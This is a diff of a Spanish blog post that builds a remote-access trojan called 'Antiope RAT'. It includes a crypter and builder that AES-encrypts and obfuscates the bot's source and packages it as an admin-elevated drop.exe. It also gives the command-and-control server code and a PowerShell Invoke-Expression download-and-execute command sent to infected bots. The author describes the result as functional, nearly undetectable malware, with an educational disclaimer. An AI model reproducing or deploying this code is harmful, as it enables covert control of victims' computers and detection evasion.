@@ -290,176 +290,178 @@ He cogido lo mejor de cada uno de los crypters mencionados y he envuelto la func
 
 Y aquí el código:
 
+```python
     
-    # pyinstaller --onefile --noconsole --clean --icon=drop.ico -n builder.exe --key=ZALFKD2VRTFSRHX9 builder.py
+# pyinstaller --onefile --noconsole --clean --icon=drop.ico -n builder.exe --key=ZALFKD2VRTFSRHX9 builder.py
+
+import base64, random, string, sys, os, pyaes
+from Tkinter import *
+import tkinter as tk
+import tkSimpleDialog
+import tkMessageBox
+import tkFileDialog
+from Crypto.Cipher import AES
+from PIL import ImageTk, Image
+from shutil import *
+from glob import *
+
+root = Tk()
+root.wm_title("Antiope RAT (CHEE Edition) - Bot Builder")
+root.config(background = "#111111")
+root.geometry("530x280")
+root.resizable(width=False, height=False)
+root.grid()
+
+img = ImageTk.PhotoImage(Image.open("antiope.gif"))
+panel = Label(root, image = img).place(x=-10, y=-10)
+
+def load_file():
+    opensource = tkFileDialog.Open(**oopts).show()
+    botsource = open(opensource).read()
+
+    cryptedsource = open('cryptedsource.py', mode='w')
+    if botsource:
+        try:
+
+			BLOCK_SIZE = 32
+			PADDING = '{'
+
+			Pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
+			Enc = lambda c, m: base64.b64encode(c.encrypt(Pad(m)))
+			Dec = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
+
+			def randomKey(bytes):
+			    return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$[]|?/&") for i in range(bytes)) 
+			def randomName():
+			    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(3)) 
+			def randomAscii():
+			    return ''.join(random.choice(string.ascii_letters) for i in range(3)) 
+
+			key = randomKey(32)
+			iv =  randomKey(16)
+			ck = randomKey(16)
+
+			cipher = AES.new(key, AES.MODE_CBC, iv)
+
+			imports = list()
+			lines = list()
+
+			for s in botsource:
+				if not s.startswith('#'):
+					if 'import' in s:
+						imports.append(s.strip())
+					else:
+						lines.append(s)
+
+			enced = Enc(cipher, "".join(lines))
+			b64Name = randomAscii() + randomName()
+			aesName = randomAscii() + randomName()
+
+			imports.append('import time, os, requests, sys, platform, socket, locale, settings, re')
+			imports.append('from base64 import b64decode as ' + b64Name)
+			imports.append('from Crypto.Cipher import AES as ' + aesName)
+			random.shuffle(imports)
+			cryptedsource.write(';'.join(imports) + "\n")
+
+			cmd = "exec(%s.new(\'%s\', %s.MODE_CBC, \'%s\').decrypt(%s(\'%s\')).rstrip('{'))\n" %(aesName, key, aesName, iv, b64Name, enced)
+
+			cryptedsource.write('exec(%s(\'%s\'))' %(b64Name, base64.b64encode(cmd)))
+			cryptedsource.close
+
+			tkMessageBox.showinfo("Successfully generated!", "Sourcecode encrypted and saved.\nYou can build your bot now!")
+
+        except:
+            showerror("Open Source File", "Failed to read file\n'%s'" % botsource)
+        return
+
+oopts = {}
+oopts['title'] = 'Choose Bot Source...'
+oopts['filetypes'] = [('Python files', '*.py')]
+
+cryptButton = Button(root, text="Encrypt Bot", command=load_file)
+cryptButton.grid(row=0,column=0)
+cryptButton.place(x=335, y=10, height=48, width=180)
+cryptButton.configure(background="#111111")
+cryptButton.configure(foreground="#ccd599")
+cryptButton.configure(pady="0")
+cryptButton.configure(relief=FLAT)
+cryptButton.configure(text='SELECT SOURCE')
+cryptButton.configure(width=200)
+cryptButton.configure(borderwidth="0")
+cryptButton.configure(activebackground="#cc0000")
+cryptButton.configure(activeforeground="#111111")
+
+class BuildBotDialog:
+
+    def __init__(self, parent):
+        top = self.top = tk.Toplevel(parent)
+        self.myLabel = tk.Label(top, text='Enter Server IP')
+        self.myLabel.pack()
+        self.myEntryBox = tk.Entry(top)
+        self.myEntryBox.pack()
+        self.myLabel1 = tk.Label(top, text='Enter Server Port')
+        self.myLabel1.pack()
+        self.myEntryBox1 = tk.Entry(top)
+        self.myEntryBox1.pack()
+        self.myLabel2 = tk.Label(top, text='Enter BOT-ID')
+        self.myLabel2.pack()
+        self.myEntryBox2 = tk.Entry(top)
+        self.myEntryBox2.pack()         
+        self.mySubmitButton = tk.Button(top, text='Build', command=self.send)
+        self.mySubmitButton.pack()
+
+    def send(self):
+        self.serverip = self.myEntryBox.get()
+        self.serverport = self.myEntryBox1.get()
+        self.sbotid = self.myEntryBox2.get()
+        self.top.destroy()
+
+def buildBot():
+    inputDialog = BuildBotDialog(root)
+    root.wait_window(inputDialog.top)
+
+    with open('settings.py', 'w+') as saveSettings:
+		saveSettings.write('SERVER_URL = "http://' + inputDialog.serverip + ":" + inputDialog.serverport + '"\n')
+		saveSettings.write('B0T_ID = "' + inputDialog.sbotid + '"\nIDLE_TIME = 120\nREQUEST_INTERVAL = 10\nPAUSE_AT_START = 1\n' )
+		saveSettings.close()
+		tkMessageBox.showinfo("Thanks!", "Going to build executable now.\nThis will take some time. Stay tuned...")
+
+		''' def randomword(length):
+			letters = string.ascii_lowercase
+			return ''.join(random.choice(letters) for i in range(length))
+
+		os.system("pyinstaller --onefile --noconsole --key " + randomword(16) + " --clean --uac-admin --icon=drop.ico -n drop.exe cryptedsource.py")
+		'''
+
+		os.system("pyinstaller --onefile --noconsole --noupx --uac-admin --icon=drop.ico -n drop.exe cryptedsource.py")
+		copyfile('dist/drop.exe', 'drop.exe')
+		filelist = glob(os.path.join(".", "*.spec"))
+		for f in filelist:
+			os.remove(f)
+		filelist = glob(os.path.join(".", "*.pyc"))
+		for f in filelist:
+			os.remove(f)
+		import shutil	
+		shutil.rmtree('build', ignore_errors=True)
+		shutil.rmtree('dist', ignore_errors=True)
+		tkMessageBox.showinfo("Done!", "Your bot is ready.\n Saved as drop.exe!")
+
+buildButton = Button(root, text="Build Bot", command=buildBot)
+buildButton.grid(row=0,column=2)
+buildButton.place(x=335, y=70, height=48, width=180)
+buildButton.configure(background="#111111")
+buildButton.configure(foreground="#ccd599")
+buildButton.configure(pady="0")
+buildButton.configure(relief=FLAT)
+buildButton.configure(text='BUILD BOT')
+buildButton.configure(width=180)
+buildButton.configure(borderwidth="0")
+buildButton.configure(activebackground="#cc0000")
+buildButton.configure(activeforeground="#111111") 
+
+root.mainloop()
     
-    import base64, random, string, sys, os, pyaes
-    from Tkinter import *
-    import tkinter as tk
-    import tkSimpleDialog
-    import tkMessageBox
-    import tkFileDialog
-    from Crypto.Cipher import AES
-    from PIL import ImageTk, Image
-    from shutil import *
-    from glob import *
-    
-    root = Tk()
-    root.wm_title("Antiope RAT (CHEE Edition) - Bot Builder")
-    root.config(background = "#111111")
-    root.geometry("530x280")
-    root.resizable(width=False, height=False)
-    root.grid()
-    
-    img = ImageTk.PhotoImage(Image.open("antiope.gif"))
-    panel = Label(root, image = img).place(x=-10, y=-10)
-    
-    def load_file():
-        opensource = tkFileDialog.Open(**oopts).show()
-        botsource = open(opensource).read()
-    
-        cryptedsource = open('cryptedsource.py', mode='w')
-        if botsource:
-            try:
-    
-    			BLOCK_SIZE = 32
-    			PADDING = '{'
-    
-    			Pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
-    			Enc = lambda c, m: base64.b64encode(c.encrypt(Pad(m)))
-    			Dec = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
-    
-    			def randomKey(bytes):
-    			    return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$[]|?/&") for i in range(bytes)) 
-    			def randomName():
-    			    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(3)) 
-    			def randomAscii():
-    			    return ''.join(random.choice(string.ascii_letters) for i in range(3)) 
-    
-    			key = randomKey(32)
-    			iv =  randomKey(16)
-    			ck = randomKey(16)
-    
-    			cipher = AES.new(key, AES.MODE_CBC, iv)
-    
-    			imports = list()
-    			lines = list()
-    
-    			for s in botsource:
-    				if not s.startswith('#'):
-    					if 'import' in s:
-    						imports.append(s.strip())
-    					else:
-    						lines.append(s)
-    
-    			enced = Enc(cipher, "".join(lines))
-    			b64Name = randomAscii() + randomName()
-    			aesName = randomAscii() + randomName()
-    
-    			imports.append('import time, os, requests, sys, platform, socket, locale, settings, re')
-    			imports.append('from base64 import b64decode as ' + b64Name)
-    			imports.append('from Crypto.Cipher import AES as ' + aesName)
-    			random.shuffle(imports)
-    			cryptedsource.write(';'.join(imports) + "\n")
-    
-    			cmd = "exec(%s.new(\'%s\', %s.MODE_CBC, \'%s\').decrypt(%s(\'%s\')).rstrip('{'))\n" %(aesName, key, aesName, iv, b64Name, enced)
-    
-    			cryptedsource.write('exec(%s(\'%s\'))' %(b64Name, base64.b64encode(cmd)))
-    			cryptedsource.close
-    
-    			tkMessageBox.showinfo("Successfully generated!", "Sourcecode encrypted and saved.\nYou can build your bot now!")
-    
-            except:
-                showerror("Open Source File", "Failed to read file\n'%s'" % botsource)
-            return
-    
-    oopts = {}
-    oopts['title'] = 'Choose Bot Source...'
-    oopts['filetypes'] = [('Python files', '*.py')]
-    
-    cryptButton = Button(root, text="Encrypt Bot", command=load_file)
-    cryptButton.grid(row=0,column=0)
-    cryptButton.place(x=335, y=10, height=48, width=180)
-    cryptButton.configure(background="#111111")
-    cryptButton.configure(foreground="#ccd599")
-    cryptButton.configure(pady="0")
-    cryptButton.configure(relief=FLAT)
-    cryptButton.configure(text='SELECT SOURCE')
-    cryptButton.configure(width=200)
-    cryptButton.configure(borderwidth="0")
-    cryptButton.configure(activebackground="#cc0000")
-    cryptButton.configure(activeforeground="#111111")
-    
-    class BuildBotDialog:
-    
-        def __init__(self, parent):
-            top = self.top = tk.Toplevel(parent)
-            self.myLabel = tk.Label(top, text='Enter Server IP')
-            self.myLabel.pack()
-            self.myEntryBox = tk.Entry(top)
-            self.myEntryBox.pack()
-            self.myLabel1 = tk.Label(top, text='Enter Server Port')
-            self.myLabel1.pack()
-            self.myEntryBox1 = tk.Entry(top)
-            self.myEntryBox1.pack()
-            self.myLabel2 = tk.Label(top, text='Enter BOT-ID')
-            self.myLabel2.pack()
-            self.myEntryBox2 = tk.Entry(top)
-            self.myEntryBox2.pack()         
-            self.mySubmitButton = tk.Button(top, text='Build', command=self.send)
-            self.mySubmitButton.pack()
-    
-        def send(self):
-            self.serverip = self.myEntryBox.get()
-            self.serverport = self.myEntryBox1.get()
-            self.sbotid = self.myEntryBox2.get()
-            self.top.destroy()
-    
-    def buildBot():
-        inputDialog = BuildBotDialog(root)
-        root.wait_window(inputDialog.top)
-    
-        with open('settings.py', 'w+') as saveSettings:
-    		saveSettings.write('SERVER_URL = "http://' + inputDialog.serverip + ":" + inputDialog.serverport + '"\n')
-    		saveSettings.write('B0T_ID = "' + inputDialog.sbotid + '"\nIDLE_TIME = 120\nREQUEST_INTERVAL = 10\nPAUSE_AT_START = 1\n' )
-    		saveSettings.close()
-    		tkMessageBox.showinfo("Thanks!", "Going to build executable now.\nThis will take some time. Stay tuned...")
-    
-    		''' def randomword(length):
-    			letters = string.ascii_lowercase
-    			return ''.join(random.choice(letters) for i in range(length))
-    
-    		os.system("pyinstaller --onefile --noconsole --key " + randomword(16) + " --clean --uac-admin --icon=drop.ico -n drop.exe cryptedsource.py")
-    		'''
-    
-    		os.system("pyinstaller --onefile --noconsole --noupx --uac-admin --icon=drop.ico -n drop.exe cryptedsource.py")
-    		copyfile('dist/drop.exe', 'drop.exe')
-    		filelist = glob(os.path.join(".", "*.spec"))
-    		for f in filelist:
-    			os.remove(f)
-    		filelist = glob(os.path.join(".", "*.pyc"))
-    		for f in filelist:
-    			os.remove(f)
-    		import shutil	
-    		shutil.rmtree('build', ignore_errors=True)
-    		shutil.rmtree('dist', ignore_errors=True)
-    		tkMessageBox.showinfo("Done!", "Your bot is ready.\n Saved as drop.exe!")
-    
-    buildButton = Button(root, text="Build Bot", command=buildBot)
-    buildButton.grid(row=0,column=2)
-    buildButton.place(x=335, y=70, height=48, width=180)
-    buildButton.configure(background="#111111")
-    buildButton.configure(foreground="#ccd599")
-    buildButton.configure(pady="0")
-    buildButton.configure(relief=FLAT)
-    buildButton.configure(text='BUILD BOT')
-    buildButton.configure(width=180)
-    buildButton.configure(borderwidth="0")
-    buildButton.configure(activebackground="#cc0000")
-    buildButton.configure(activeforeground="#111111") 
-    
-    root.mainloop()
-    
+```
 
 #### El Servidor CnC
 
@@ -469,76 +471,80 @@ La parte del servidor no he cambiado mucho, ya que viene con todo que se necesit
 
 La parte importante de la de comunicación con los bots es la siguiente:
 
-    
-    class CNC(object):
-        @cherrypy.expose
-        @require_admin
-        def index(self):
-            bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
-            output = ""
-            for bot in bot_list:
-                output += '<tr><td><a href="bot?botid=%s">%s</a></td><td>%s</td><td>%s</td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td></tr>' % (bot[0], bot[0], "Online" if time.time() - 30 < bot[1] else time.ctime(bot[1]), bot[2], bot[3],
-                    bot[0])
-            with open("list.html", "r") as f:
-                html = f.read()
-                html = html.replace("{{bot_table}}", output)
-                return html
-    
-        @cherrypy.expose
-        @require_admin
-        def bot(self, botid):
-            if not validate_botid(botid):
-                raise cherrypy.HTTPError(403)
-            with open("bot.html", "r") as f:
-                html = f.read()
-                html = html.replace("{{botid}}", botid)
-                return html
-    
-    class API(object):
-        @cherrypy.expose
-        def pop(self, botid, sysinfo):
-            if not validate_botid(botid):
-                raise cherrypy.HTTPError(403)
-            bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
-            if not bot:
-                exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?)", (html_escape(botid), time.time(), html_escape(cherrypy.request.headers["X-Forwarded-For"]) if "X-Forwarded-For" in cherrypy.request.headers else cherrypy.request.remote.ip, html_escape(sysinfo)))
-            else:
-                exec_DB("UPDATE bots SET lastonline=? where name=?", (time.time(), botid))
-            cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
-            if cmd:
-                exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
-                exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), "&gt; " + cmd[0][2], html_escape(botid)))
-                return cmd[0][2]
-            else:
-                return ""
-    
-        @cherrypy.expose
-        def report(self, botid, output):
-            if not validate_botid(botid):
-                raise cherrypy.HTTPError(403)
-            exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), html_escape(output), html_escape(botid)))
-    
-        @cherrypy.expose
-        @require_admin
-        def push(self, botid, cmd):
-            if not validate_botid(botid):
-                raise cherrypy.HTTPError(403)
-            exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, html_escape(botid)))
-    
-        @cherrypy.expose
-        @require_admin
-        def stdout(self, botid):
-            if not validate_botid(botid):
-                raise cherrypy.HTTPError(403)
-            output = ""
-            bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC', (botid,))
-            for entry in reversed(bot_output):
-                output += "%s\n\n" % entry[2]
-            bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
-            for entry in bot_queue:
-                output += "> %s [...]\n\n" % entry[2]
-            return output
-            
+```python
+
+class CNC(object):
+    @cherrypy.expose
+    @require_admin
+    def index(self):
+        bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
+        output = ""
+        for bot in bot_list:
+            output += '<tr><td><a href="bot?botid=%s">%s</a></td><td>%s</td><td>%s</td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td></tr>' % (bot[0], bot[0], "Online" if time.time() - 30 < bot[1] else time.ctime(bot[1]), bot[2], bot[3],
+                bot[0])
+        with open("list.html", "r") as f:
+            html = f.read()
+            html = html.replace("{{bot_table}}", output)
+            return html
+
+    @cherrypy.expose
+    @require_admin
+    def bot(self, botid):
+        if not validate_botid(botid):
+            raise cherrypy.HTTPError(403)
+        with open("bot.html", "r") as f:
+            html = f.read()
+            html = html.replace("{{botid}}", botid)
+            return html
+
+class API(object):
+    @cherrypy.expose
+    def pop(self, botid, sysinfo):
+        if not validate_botid(botid):
+            raise cherrypy.HTTPError(403)
+        bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
+        if not bot:
+            exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?)", (html_escape(botid), time.time(), html_escape(cherrypy.request.headers["X-Forwarded-For"]) if "X-Forwarded-For" in cherrypy.request.headers else cherrypy.request.remote.ip, html_escape(sysinfo)))
+        else:
+            exec_DB("UPDATE bots SET lastonline=? where name=?", (time.time(), botid))
+        cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
+        if cmd:
+            exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
+            exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), "&gt; " + cmd[0][2], html_escape(botid)))
+            return cmd[0][2]
+        else:
+            return ""
+
+    @cherrypy.expose
+    def report(self, botid, output):
+        if not validate_botid(botid):
+            raise cherrypy.HTTPError(403)
+        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), html_escape(output), html_escape(botid)))
+
+    @cherrypy.expose
+    @require_admin
+    def push(self, botid, cmd):
+        if not validate_botid(botid):
+            raise cherrypy.HTTPError(403)
+        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, html_escape(botid)))
+
+    @cherrypy.expose
+    @require_admin
+    def stdout(self, botid):
+        if not validate_botid(botid):
+            raise cherrypy.HTTPError(403)
+        output = ""
+        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC', (botid,))
+        for entry in reversed(bot_output):
+            output += "%s\n\n" % entry[2]
+        bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
+        for entry in bot_queue:
+            output += "> %s [...]\n\n" % entry[2]
+        return output
+
+
+```
+
 
 En vez de tirar por el camino de Ares, que saca su funcionalidad de los módulos, uso únicamente el runcmd para ejecutar comandos de Powershell.
 
@@ -546,32 +552,37 @@ Por ejemplo para la función de descargar y ejecutar un fichero:
 
 HTML:
 
-    
-    <div class="botcmd">
-    <input type="text" name="downloadex" id="downloadex" onkeypress="keypressed(event)" />
-    <button type="submit" onclick="download_execute()">Download &amp; Execute &raquo;</button>
-    </div>
+```html
+
+<div class="botcmd">
+<input type="text" name="downloadex" id="downloadex" onkeypress="keypressed(event)" />
+<button type="submit" onclick="download_execute()">Download &amp; Execute &raquo;</button>
+</div>
+
+```
 
 JavaScript:
 
-    
-    function download_execute(e) {
-        $.post("../api/push", {
-            'botid': '{{botid}}',
-            'cmd': 'powershell.exe -nop -command "Invoke-Expression ((New-Object Net.WebClient).DownloadString(\'' + $('#downloadex').val() + '\'))"'
-        });
-        $('#downloadex').val('');
-        return false;
-    }
-    
+```Javascript
 
-Estrenando crypter y server:
+function download_execute(e) {
+    $.post("../api/push", {
+        'botid': '{{botid}}',
+        'cmd': 'powershell.exe -nop -command "Invoke-Expression ((New-Object Net.WebClient).DownloadString(\'' + $('#downloadex').val() + '\'))"'
+    });
+    $('#downloadex').val('');
+    return false;
+}
+    
+```
+
+#### Estrenando crypter y server:
 
 <style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container'><iframe src='https://www.youtube.com/embed/undefined' frameborder='0' allowfullscreen></iframe></div>
 
 ¡Voila! Un malware funcional y casi indetectable (hay que tener en cuenta que lo hice con fines educativos; publicando el código y subiendo los samples a virustotal).
 
-En la segunda parte me centraré en stagers, binders y en la falsificación de firmas.
+En la segunda parte daré otra vuelta a Antiope y me centraré en stagers, binders y en la falsificación de firmas.
 
 Mientras dejo más material para aprender sobre Python-reversing y Python malware:
 
